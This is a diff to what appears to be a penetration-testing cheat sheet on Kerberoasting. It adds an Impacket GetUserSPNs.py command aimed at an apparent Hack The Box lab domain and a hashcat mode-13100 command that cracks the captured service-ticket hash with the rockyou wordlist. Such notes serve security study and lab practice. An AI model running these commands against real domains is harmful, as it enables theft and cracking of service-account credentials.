@@ -18,10 +18,18 @@
 GetUserSPNs.py <Domain>/<username>:<password> -dc-ip <IP> -request
 ```
 
+```bash
+GetUserSPNs.py -request -dc-ip 10.10.11.129 search.htb/hope.sharp -outputfile web_svc.hash
+```
+
 * Cracking Kerberos 5 etype 23 TGS-REP:
 
 ```bash
 hashcat -m 13100 -a 0 hash.txt Pass.txt
+```
+
+```bash
+hashcat -m 13100 web_svc.hash /usr/share/wordlists/rockyou.txt 
 ```
 
 ### Service Tickets
